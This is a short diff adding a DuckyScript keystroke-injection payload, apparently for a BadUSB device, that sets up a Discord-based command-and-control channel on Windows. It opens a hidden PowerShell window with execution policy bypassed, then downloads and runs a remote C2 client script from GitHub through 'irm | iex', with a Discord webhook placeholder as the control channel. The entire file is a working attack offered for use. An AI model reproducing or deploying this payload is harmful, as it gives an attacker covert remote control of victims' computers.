@@ -1,0 +1,17 @@
+
+REM Title: beigeworm's Discord Command And Control.
+REM Author: @beigeworm
+REM Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
+REM Target: Windows 10 and 11
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex
+ENTER
+
+
